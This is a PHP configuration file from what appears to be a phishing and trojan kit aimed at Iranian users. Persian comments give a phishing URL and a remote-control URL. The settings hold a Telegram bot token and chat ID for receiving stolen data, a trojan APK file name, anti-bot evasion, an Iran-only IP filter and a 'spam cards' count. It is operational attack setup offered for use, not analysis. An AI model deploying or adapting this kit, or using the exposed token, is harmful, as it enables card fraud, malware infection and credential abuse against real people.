<?php


########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################

/*

لینک برای تار زنی

http://mydomain.co/?login

لینک برای ریموت

http://mydomain.co/?app

آیدی چنل تلگرام 

https://t.me/DeragonTM

*/


#Telegram Bot Token 

define ("API_KEY", "8314828631:AAFydOJ7b__H4kf0XNlEqvhbzYr35EXgjz4") ;

#Chat ID of Telegram message sending path 

define("CHAT_ID", "-1002750329475") ;

#Trojan application file path

$Eblaghapk = "V6.apk";

#Google anti bot 

$Botlimit = true ; // true = on | false = off

#IP Checker : Iran IP only 

$IPlimit = true ; // true = on | false = off

#Number of spam cards

$Spam = 3 ; // Type Is Integer *




########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################




?>